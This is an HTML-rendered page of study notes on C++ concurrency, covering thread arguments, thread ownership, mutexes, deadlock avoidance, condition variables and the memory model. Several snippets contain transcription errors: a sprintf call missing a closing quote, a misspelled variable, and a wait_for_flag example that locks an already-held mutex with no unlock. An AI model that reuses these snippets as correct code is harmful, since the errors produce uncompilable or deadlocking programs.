href="#2-2-Passing-arguments-to-a-thread-function" class="headerlink" title="2.2 - Passing arguments to a thread function"></a>2.2 - Passing arguments to a thread function</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void f(int i, std::string const&amp; s);<br><br>std::thread t(f, 3, &quot;hello&quot;);<br></code></pre></td></tr></table></figure><p>Note that even though f takes a <code>std::string</code> as the second parameter, the string literal is passwd as a char const* and converted to a std::string only in the context of the new thread. This is particularly important when the argument supplied is a pointer to an automatic variable, as follows:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void f(int i, std::string const&amp; s);<br>void oops(int some_param)<br>&#123;<br>    char buffer[1024];<br>    sprintf(buffer, &quot;%i%, some_param);<br>    std::thread t(f, 3, buffer);<br>    t.detach();<br>&#125;<br></code></pre></td></tr></table></figure><br>In this case, it’s the pointer to the local variable <code>buffer</code> that’s passed through to the new thread and there’s a significant chance that the <code>oops</code> function will exit before the buffer has been converted to a <code>std::string</code> on the new thread, thus leading to undefined behavior. This solution is to cast to std::string before passing the buffer to the <code>std::thread</code> constructor:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void f(int i, std::string const&amp; s);<br>void oops(int some_param)<br>&#123;<br>    char buffer[1024];<br>    sprintf(buffer, &quot;%i%, some_param);<br>    std::thread t(f, 3, std::string(buffer));<br>    t.detach();<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="2-3-Transferring-ownership-of-a-thread"><a href="#2-3-Transferring-ownership-of-a-thread" class="headerlink" title="2.3 - Transferring ownership of a thread"></a>2.3 - Transferring ownership of a thread</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void some_function();<br>void some_other_function();<br>std::thread t1(some_function);<br>std::thread t2 = std::move(t1);<br>t1 = std::thread(some_other_function);<br>std::thread t3;<br>t3 = std::move(t2);<br>t1 = std::move(t3); //This assignment will terminate the program!<br></code></pre></td></tr></table></figure><p>First, a new thread is started and associated with <code>t1</code>. Ownership is then transferred over to <code>t2</code> when <code>t2</code> is constructed, by invoking <code>std::move()</code> to explicitly move ownership. At this point, <code>t1</code> no longer has an associated thread of execution; the thread running <code>some_function</code> is now associated with <code>t2</code>.</p><p>The final move tansfers ownership of the thread running <code>some_function</code> back to <code>t1</code> where it started. But in this case <code>t1</code> already had an associated thread (which was running some_other_function), so <code>std::terminate()</code> is called to terminated the program.</p><p>You cannot just drop a thread by assigning a new value to the <code>std::thread</code> object that manages it.</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::thread f()<br>&#123;<br>    void some_function();<br>    return std::thread(some_function);<br>&#125;<br>std::thread g()<br>&#123;<br>    void some_other_function(int);<br>    std::thread t(some_other_function, 42);<br><br>    return t;<br>&#125;<br></code></pre></td></tr></table></figure><p>Likewise, if ownership should be transferred into a function, it can accept an instance of <code>std::thread</code> by value as one of the parameters, as shown here:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void f(std::thread t);<br>void g()<br>&#123;<br>    void some_function();<br>    f(std::thread(some_function));<br>    std::thread t(some_function);<br><br>    f(std::move(t));<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id=""><a href="#" class="headerlink" title=""></a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">class scoped_thread<br>&#123;<br>    std::thread t;<br>public:<br>    explicit scoped_thread(std::thread t_): t(std::move(t_))<br>    &#123;<br>        if (!t.joinable())<br>            throw std::logic_error(&quot;No thread&quot;);<br>    &#125;<br><br>    ~scoped_thread()<br>    &#123;<br>        t.join();<br>    &#125;<br><br>    scoped_thread(scoped_thread const&amp;) = delete;<br>    scoped_thread&amp; operator=(scoped_thread const&amp;)=delete;<br>&#125;;<br><br>struct func;<br>void f()<br>&#123;<br>    int some_local_state;<br>    scoped_thread t&#123;std::thread(func(some_local_state))&#125;;<br>    do_something_in_current_thread();<br>&#125;<br></code></pre></td></tr></table></figure></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void do_work(unsigned id);<br>void f()<br>&#123;<br>    std::vector&lt;std::thread&gt; threads;<br>    for (unsigned i = 0; i &lt; 20; ++i)<br>    &#123;<br>        threads.emplace_back(do_work, i);<br>    &#125;<br><br>    for (auto&amp; entry: threads)<br>        entry.join();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-5-Identifying-threads"><a href="#2-5-Identifying-threads" class="headerlink" title="2.5 - Identifying threads"></a>2.5 - Identifying threads</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::thread::id master_thread;<br>void some_core_part_of_algorithm()<br>&#123;<br>    if (std::this_thread::get_id() == master_thread)<br>    &#123;<br>        do_master_thread_work();<br>    &#125;<br><br>    do_common_work();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Chapter-3-Sharing-data-between-threads"><a href="#Chapter-3-Sharing-data-between-threads" class="headerlink" title="Chapter.3 - Sharing data between threads"></a>Chapter.3 - Sharing data between threads</h1><p>If you’re sharing data between threads, you need to have rules for which thread can access which bit of data when, and how any updates are communicated to the other threads that care about the data.</p><p>Incorrect use of shared data is one of the biggest causes of concurrency-related bugs, and the consequence can be serious.</p><h2 id="3-1-Problems-with-sharing-data-between-threads"><a href="#3-1-Problems-with-sharing-data-between-threads" class="headerlink" title="3.1 - Problems with sharing data between threads"></a>3.1 - Problems with sharing data between threads</h2><p>The probles with sharing data between threads are all due to the consequences of modifying data. <strong>If all shared data is read-only, there’s no problem, because the data read by on thread is unaffected by whether or not another thread is reading the same data</strong>.</p><p>Once concept that’s widely used to help programmers reason about their code is <strong>invariants</strong>——statements that are always true about a particular data struct, such as “this variable contains” the number of items in the list.” This invariants are often broken during an update, especially if the data structure is of any complexity or the update requires modification of more than one value.</p><h3 id="Race-conditions"><a href="#Race-conditions" class="headerlink" title="Race conditions"></a>Race conditions</h3><p>In concurrency, a race condition is anything where the outcome depends on the relative ordering of execution of operations on two or more threads; the threads race to perform their respective operations. This term is usually used to mean a <strong>problematic</strong> race condition.</p><p>The C++ standard also defines the term <strong>data race</strong> to mean the specific type of race condition; data races cause the dreaded <strong>undefined behavior</strong>.</p><h3 id="Avoiding-problematic-race-conditions"><a href="#Avoiding-problematic-race-conditions" class="headerlink" title="Avoiding problematic race conditions"></a>Avoiding problematic race conditions</h3><p>The simplest option is to wrap your data structure with a protection mechanism to ensure that only the thread performing a modification can see the intermediate states <strong>where the invariants are broken</strong>.</p><p>We can use <strong>memory model</strong>, <strong>lock-free</strong> to solve this problem.</p><h2 id="3-2-Protecting-shared-data-with-mutexes"><a href="#3-2-Protecting-shared-data-with-mutexes" class="headerlink" title="3.2 - Protecting shared data with mutexes"></a>3.2 - Protecting shared data with mutexes</h2><p><strong>Mutex</strong> stands for <strong>Mutual Exclusion</strong>.</p><p>Before accessing a shared data structure, you <strong>lock</strong> the mutex associated with that data, and when you’ve finished accessing the data structure, you <strong>unlock</strong> the mutex.</p><p>Mutexes are the most general of the data-rpotection mechanisms available in C++, but they’re not a silver bullet; it’s important to structure your code to protect in right data and avoid race conditions inherent in your interfaces.</p><p>Mutexes also come with their own problems in the form of a <strong>deadlock</strong> and protecting either too much or too little data.</p><h3 id="Using-mutexes-in-C"><a href="#Using-mutexes-in-C" class="headerlink" title="Using mutexes in C++"></a>Using mutexes in C++</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;mutex&gt;<br>#include &lt;algorithm&gt;<br><br>std::list&lt;int&gt; some_list;<br>std::mutex some_mutex;<br><br>void add_to_list(int new_value)<br>&#123;<br>    std::lock_guard&lt;std::mutex&gt; guard(some_mutex);<br>    some_list.push_back(new_value);<br>&#125;<br><br>bool list_contains(int value_to_find)<br>&#123;<br>    std::lock_guard&lt;std::mutex&gt; guard(some_mutex);<br>    return std::find(some_list.begin(),some_list.end(),value_to_find)<br>    != some_list.end();<br>&#125;<br></code></pre></td></tr></table></figure><p>If one of he member functions returns a pointer or reference to the protected data, then it doesn’t matter that the member functions all lock the mutex in a nice, orderly fashion, because you’ve blown a big hole in the protection. **Any code that has access to that pointer or reference can now access (and potentially modify) the protected data without locking the mutex.</p><p>Protecting data with mutex therefore requires careful interface design to ensure that the mutex is locked befored there’s any access to the protected data and that there are no backdoor.</p><h3 id="Structuring-code-for-protecting-shared-data"><a href="#Structuring-code-for-protecting-shared-data" class="headerlink" title="Structuring code for protecting shared data"></a>Structuring code for protecting shared data</h3><p>Protecting data with mutex is not quite as easy as slapping an <code>std::guard</code> object in every member function; one stray pointer or reference, and all that protection is for nothing.</p><p>As well as checking that the member functions don’t pass out pointers or references to their callers, it’s also important to check that they don’t pass there pointers or references <strong>IN</strong> to functions they call that arent’s under you control, this is dangerous.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">class some_data<br>&#123;<br>    int a;<br>    std::string b;<br>public:<br>    void do_something();<br>&#125;;<br>class data_wrapper<br>&#123;<br>private:<br>    some_data data;<br>    std::mutex m;<br>public:<br>    template&lt;typename Function&gt;<br>    void process_data(Function func)<br>    &#123;<br>        std::lock_guard&lt;std::mutex&gt; l(m);<br>        func(data);<br>    &#125;<br>&#125;;<br><br>some_data* unprotected;<br>void malicious_function(some_data&amp; protected_data)<br>&#123;<br>    unprotected=&amp;protected_data;<br>&#125;<br><br>data_wrapper x;<br>void foo()<br>&#123;<br>    x.process_data(malicious_function);<br>    upprotected-&gt;do_something();<br>&#125;<br></code></pre></td></tr></table></figure><br>In this example, the code in <code>process_data</code> looks harmless enough, nicely protected with <code>std::lock_guard</code>, but the call to the user-supplied <code>func</code> function means that <code>foo</code> can pass in <code>malicious_function</code> to <strong>bypass the protection</strong> and then call <code>do_something()</code> without the mutex being locked.</p><blockquote><p>Guidline: Don’t pass pointers and references to protected data outside the scope of the lock, whether by returning them from a function, storing them in externally visible memory, or passing them as arguments to user-supplied functions.</p></blockquote><p>Just because you’re using a mutex or other mechanism to protect shared data, it doesn’t mean you’re protected from race conditions; you still have to ensure that the appropriate data is protected.</p><p>Consider the doubly linked list example. If you protected access to the pointers of each node individually, you’d be no better off than with code that used no mutexes, because the race condition could still happen——it’s not the individual nodes that need protecting for the individual steps but the whole data structure, for the whole delete operation. The easiest solution in this case is to have a single mutex that protects the entire list.</p><h3 id="Deadlock-the-problem-and-a-solution"><a href="#Deadlock-the-problem-and-a-solution" class="headerlink" title="Deadlock: the problem and a solution"></a>Deadlock: the problem and a solution</h3><p>Imagine a pair of threads arguing over locks on mutexes: each of a pair of threads needs to lock both of a pair of mutexes to perform some operation, and each thread has one mutex and is waiting for the other. Neither thread can proceed, because each is waiting for the other to release its mutex. This scenario is called <strong>deadlock</strong>, and it’s the biggest problem with having to lock two or more mutexes in order to perform an operation.</p><p>The common advice for avoiding deadlock is to always lock the two mutexes in the same order.</p><p>The C++ Standard Library has a cure for this in the form of <code>std::lock</code>——a function that can lock two or more mutexes at once without risk of deadlock.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">class some_big_object;<br>void swap(some_big_object&amp; lhs, some_big_object&amp; rhs);<br>class X<br>&#123;<br>private:<br>    some_big_object some_detail;<br>    std::mutex m;<br>public:<br>    X(some_big_object const&amp; sd): some_detail(sd) &#123;&#125;<br><br>    friend void swap(X&amp; lhs, X&amp; rhs)<br>    &#123;<br>        if (&amp;lhs==&amp;rhs)<br>            return;<br><br>        std::lock(lhs.m, rhs.m);<br>        std::lock_guard&lt;std::mutex&gt; lock_a(lhs.m, std::adopt_lock);<br>        std::lock_guard&lt;std::mutex&gt; lock_b(rhs.m, std::adopt_lock);<br>        swap(lhs.some_detail, rhs.some_detail);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>First, the arguments are checked to ensure they are different instances, because attempting to acquire a lock on <code>std::mutex</code> when you already hold it is undefined behavior (A mutex that does permit multiple locks by the same thread is provided in the form of <code>std::recursive_mutex</code>.).<br>Then, the call to <code>std::lock()</code> locks the two mutexes, and two <code>std::lock_guard</code> instances are constructed and, one for each mutex.<br>The <code>std::adopt_lock</code> parameter is supplied in addition to the mutex to indicate to the <code>std::lock_guard</code> objects that the mutexes are already locked, and they should adopt the ownership of the existing lock on the mutex rather than attempt to lock the mutex in the constructor.</p><p>C++17 provides additional support for this scenario, in the form of a new RAII termplate, <code>std::scoped_lock&lt;&gt;</code>. This is exactly equivalent to <code>std::lock_guard&lt;&gt;</code>, except that it is a <strong>variadic template</strong>, accepting a <strong>list</strong> of mutex types as template parameters, and a <strong>list</strong> of mutexes as constructor arguments. The mutexes supplied to the constructor are locked using the same algorithm as <code>std::lock</code>, so that when the constructor completes they are all locked, and they are then all unlocked in the destructor.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void swap(X&amp; lhs, X&amp; rhs)<br>&#123;<br>    if(&amp;lhs==&amp;rhs)<br>        return;<br>    std::scoped_lock guard(lhs.m,rhs.m);<br>    swap(lhs.some_detail,rhs.some_detail);<br>&#125;<br></code></pre></td></tr></table></figure><br>This example uses another feature added with C++17: automatic deduction of class template parameters.<br>This line is equivalent to the equivalent to the fully specified version:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::scoped_lock&lt;std::mutex, std::mutex&gt; guard(lhs.m, rhs.m);<br></code></pre></td></tr></table></figure></p><p>The existence of <code>std::scoped_lock</code> means that most of the cases where you would have used <code>std::lock</code> prior to C++17 can now be written using <code>std::scoped_lock</code>, with less potential for mistakes.</p><p>You have to rely on your discipline as developers to ensure you don’t get get deadlock. This isn’t easy: deadlocks are one of the nastiest problems to encounter in multithreaded code and are often unpredictable, with everything working fine the majority of the time.</p><h3 id="Futher-guidlines-for-avoiding-deadlock"><a href="#Futher-guidlines-for-avoiding-deadlock" class="headerlink" title="Futher guidlines for avoiding deadlock"></a>Futher guidlines for avoiding deadlock</h3><p>Deadlock doesn’t only occur with locks. You can create deadlock with two threads and no locks by having each thread call <code>join()</code> on the <code>std::thread</code> object for the other. In this case, neither thread can make progress because it’s waiting for the other to finish.</p><p>The guidlines for avoiding deadlock all boil down to one idea: don’t wait for another thread if there’s a chance it’s waiting for you.</p><ul><li><strong>Avoid nested locks</strong>:<br>Don’t acquire a lock if you already hold one. If you stick to this guidline, it’s impossible to get a deadlock from the lock usage alone because each thread only ever holds a single lock. You should still get deadlock from other things (like the threads waiting for each other), but mutex locks are probably the most common cause of deadlock.</li><li><strong>Avoid calling user-suplied code while holding a lock</strong>:<br>This is a simple follow-on from the previous guidline. Because the code is user-supplied, you have no idea what it could do; it could do anything, including acquiring a lock.</li><li><strong>Acquire locks in a fixed order</strong>:<br>If you absolutely must acquire two or more locks, and you can’t acquire them as a single operation with <code>std::lock</code>, the next best thing is to acquire them in the same order in every thread.</li><li><strong>Use a lock hiearchy</strong>:<br>Although this is a particular case of defining lock ordering, a lock hierarchy can provide a means of checking that the convention is adhered to at runtime. The idea is that you divide your application into layers and identify all the mutexes that may be locked in any given layer.</li><li><strong>Extending these guidlines beyond locks</strong>:<br>Deadlocks also occur with any synchronization construct that can lead to a wait cycle.\<br>If you’re going to wait for a thread to finish, it might be worth identifying a thread hierarchy, so that a thread waits only for threads lower down the hierarchy. One simple way to do this is to ensure that your threads are joined in the same function that started them.</li></ul><h3 id="Flexible-locking-with-std-unique-lock"><a href="#Flexible-locking-with-std-unique-lock" class="headerlink" title="Flexible locking with std::unique_lock"></a>Flexible locking with <code>std::unique_lock</code></h3><p>Once you’ve designed your code to avoid deadlock, <code>std::lock()</code> and <code>std::lock_guard</code> cover most of the cases of simle locking, but sometimes more flexibility is required.</p><p><code>std::unique_lock</code> provides a bit more flexibility than <code>std::lock_guard</code> by relaxing the invariants; an <code>std::unique_lock</code> instance doesn’t always own the mutex that it’s associated with.</p><p>You can pass <code>std::adopt_lock</code> as a second argument to the constructor to have the lock object manage the lock on a mutex, you can also pass <code>std::defer_lock</code> as the second argument to indicate that the mutex should remain unlocked on construction.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">class some_big_object;<br>void swap(some_big_object&amp; lhs,some_big_object&amp; rhs);<br>class X<br>&#123;<br>private:<br>    some_big_object some_detail;<br>    std::mutex m;<br>public:<br>    X(some_big_object const&amp; sd):some_detail(sd)&#123;&#125;<br>    friend void swap(X&amp; lhs, X&amp; rhs)<br>    &#123;<br>        if (&amp;lhs == &amp;rhs)<br>            return;<br><br>        std::unique_lock&lt;std::mutex&gt; lock_a(lhs.m, std::defer_lock);<br>        std::unique_lock&lt;std::mutex&gt; lock_b(rhs.m, std::defer_lock);<br>        std::lock(lock_a, lock_b);<br>        swap(lhs.some_detail, rhs.some_detail);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>Using <code>std::unique_lock</code> and <code>std::defer_lock</code>, rather than <code>std::lock_guard</code> and <code>std::adopt_lock</code>.</p><p><code>std::unique_lock</code> objects could be passed to <code>std::lock()</code>, because <code>std::unique_lock</code> provides <code>lock()</code>, <code>try_lock()</code>, and <code>unlock()</code> member functions.</p><h3 id="Transferring-mutex-ownership-between-scopes"><a href="#Transferring-mutex-ownership-between-scopes" class="headerlink" title="Transferring mutex ownership between scopes"></a>Transferring mutex ownership between scopes</h3><p>Because <code>std::unique_lock</code> instances don’t have to own their associated mutexes, the ownership of mutex can be transferred between instances by moving the instances around.</p><h3 id="Locking-at-an-appropriate-granularity"><a href="#Locking-at-an-appropriate-granularity" class="headerlink" title="Locking at an appropriate granularity"></a>Locking at an appropriate granularity</h3><p>The lock granularity is a hand-waving term to describe the amount of data protected by a single lock. A fine-grained lock protects a small amount of data, and a coarse-grained lock protects a large amount of data.</p><h2 id="3-3-Alternative-facilities-for-protecting-shared-data"><a href="#3-3-Alternative-facilities-for-protecting-shared-data" class="headerlink" title="3.3 - Alternative facilities for protecting shared data"></a>3.3 - Alternative facilities for protecting shared data</h2><h1 id="Chapter-4-Synchronizing-concurrent-operations"><a href="#Chapter-4-Synchronizing-concurrent-operations" class="headerlink" title="Chapter.4 - Synchronizing concurrent operations"></a>Chapter.4 - Synchronizing concurrent operations</h1><p>Sometimes you don’t just need to protect the data, you also need to synchronize actions on separate threads. One thread might need to wait for another thread to complete a task before the thread can complete its own, for example. In general, it’s common to want a thread to wait for a specific event to happen or a condition to be <code>true</code>.</p><h2 id="4-1-Waiting-for-an-event-or-other-condition"><a href="#4-1-Waiting-for-an-event-or-other-condition" class="headerlink" title="4.1 - Waiting for an event or other condition"></a>4.1 - Waiting for an event or other condition</h2><p>If one thread is waiting for a second thread to complete a task, it has several options. First, it could keep checking a flag in shared data (protected by mutex) and have the second thread set the flag when it come pletes the task. This is wasteful on two counts: the thread consumes valuable processing time repeatedly checking the flag, and when the mutex is locked by the waiting thread, it can’t be locked by any other thread.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bool flags;<br>std::mutex m;<br>void wait_for_flag()<br>&#123;<br>    std::unique_lock&lt;std::mutex&gt; lk(m);<br>    std::this_thread::sleep_for(std::chrono::miliseconds(100));<br>    lk.lock();<br>&#125;<br></code></pre></td></tr></table></figure><p>In the loop, the function unlocks the mutex before the sleep, and locks it again afterward so another thread gets a chance to acquire it and set the flag.</p><p>This is an improvement because the thread does not waste processing time while it’s sleep, but it’s hard to get the sleep period right.</p><p><strong>The third and preferred option is to use the facilities from the C++ Standard Libaray to wait for the event itself</strong>.</p><h3 id="Waiting-for-a-condition-with-condition-variables"><a href="#Waiting-for-a-condition-with-condition-variables" class="headerlink" title="Waiting for a condition with condition variables"></a>Waiting for a condition with condition variables</h3><p>The Standard C++ Library provides two implementations of a condition variable: <code>std::condition_variable</code> and <code>std::condition_variable_any</code>. Both of these are declared in the <code>&lt;condition_variable&gt;</code> library header.</p><p>In both cases, they need to work with a mutex in order to provide appropriate synchronization the former is limited to working with <code>std::mutex</code>, whereas the latter can work with anything that meets the mimimal criteria for being mutex-like, hence the <code>_any</code> suffix. </p><p><code>std::condition_variable_any</code> is more general, there’s the potential for additional consts in terms of size, performance, or OS resources, so <code>std::condition_variable</code> should be preferred unless the additional flexibility is required.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::mutex mut;<br>std::queue&lt;data_chunk&gt; data_queue;<br>std::condition_variable data_cond;<br><br>void data_preparation_thread()<br>&#123;<br>    while (more_data_to_prepare())<br>    &#123;<br>        data_chunk const data = prepare_data();<br>        &#123;<br>            std::lock_guard&lt;std::mutex&gt; lk(mut);<br>            data_queue.push(data);<br>        &#125;<br><br>        data_cond.notify_one();<br>    &#125;<br>&#125;<br><br>void data_processing_thread()<br>&#123;<br>    while (true)<br>    &#123;<br>        std::unique_lock&lt;std::mutex&gt; lk(mut);<br>        data_cond.wait(<br>            lk, []&#123;return !data_queue.empty();&#125;<br>        );<br>        data_chunk data = data_queue.front();<br>        data_queue.pop();<br>        lk.unlock();<br>        process(data);<br>        if (is_last_chunk(data))<br>            break;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>You have a queue that’s used to pass the data between two therads.</li><li>Note that you put the code to push the data onto the queue in a smaller scope, so you notify the condition variable <strong>after</strong> unlocking the mutex.</li><li>On the other side of the fence, you have the processing thread. This thread first locks the mutex, but this time with a <code>std::unique_lock</code> rather than a <code>std::lock_guard</code>. The reason is <code>std::unique_lock</code> is reusable. The waiting thread must unlock the mutex while it’s waiting and lock it again afterward, and <code>std::lock_guard</code> doesn’t provide that flexibility.</li></ol><h1 id="Chapter-5-The-C-memory-model-and-operations-on-atomic-types"><a href="#Chapter-5-The-C-memory-model-and-operations-on-atomic-types" class="headerlink" title="Chapter.5 - The C++ memory model and operations on atomic types"></a>Chapter.5 - The C++ memory model and operations on atomic types</h1><p>This chapter will start by convering the basic of the memory model, then move on to the atomic types and operations, and finally cover the various types of synchronization available with the operations on atomic types.</p><h2 id="5-1-Memory-model-basic"><a href="#5-1-Memory-model-basic" class="headerlink" title="5.1 - Memory model basic"></a>5.1 - Memory model basic</h2><h3 id="Objects-and-memory-locations"><a href="#Objects-and-memory-locations" class="headerlink" title="Objects and memory locations"></a>Objects and memory locations</h3><p>The C++ Standard defines an object as “a region of storage”, although it goes on to assign properties to these objects, such as their type and lifetime.</p><p>Whatever its type, an object is stored in one or more <strong>memory locations</strong>. Each memory location is either an object (or sub-object) of a scalar type such as <code>unsigned short</code> or <code>my_class*</code> or a sequence of adjacent bit fields. If you use bit fields, this is an important point to note: though adjacent bit fields are distinct objects, they’re still counted as the same memory location.</p><p align="center" class='item-img' data-src='/images/books/CppConcurrency/fig5.1.png'><img src="/images/books/CppConcurrency/fig5.1.png" width="400"></p><p>There are four important things to take away from this:</p><ol><li>Every variable is an object, including those that are members of other objects.</li><li>Every object occupies <strong>at least one</strong> memory location.</li><li>Variables of fundamental types such as <code>int</code> or <code>char</code> occupy exactly <strong>one</strong> memory location, whatever their size, even if they’re adjacent or part of an array.</li><li>Adjacent bit fields are part of the same memory location.</li></ol><h3 id="Objects-memory-locations-and-concurrency"><a href="#Objects-memory-locations-and-concurrency" class="headerlink" title="Objects, memory locations and concurrency"></a>Objects, memory locations and concurrency</h3><p>If two threads access <strong>separate</strong> memory locations, there’s no problem: everything works fine. On the other hand, if two threads access the <strong>same</strong> memory location, then you have to be careful.\<br>If neither thread is updating the memory location, you’re fine; read-only data does not need protection or synchronization.<br>If either thread is modifying the data, there’s a potential for a race condition.</p><p>Solutions:</p><ol><li>mutexes.</li><li>Synchronization properties of <strong>atomic</strong> operations.</li></ol><p>If two threads access the same memory location, each pair of accesses must have a defined ordering.</p><p>If there’s no enofrced ordering between two accesses to a single memory location from separate threads, one or both of those accesses is no atomic, and if one or both is a write, then this is a data race and causes undefined behavior.</p><h3 id="Modification-orders"><a href="#Modification-orders" class="headerlink" title="Modification orders"></a>Modification orders</h3><p>If you do use atomic operations, the compiler is responsible for ensuring that the necessary synchronization is in 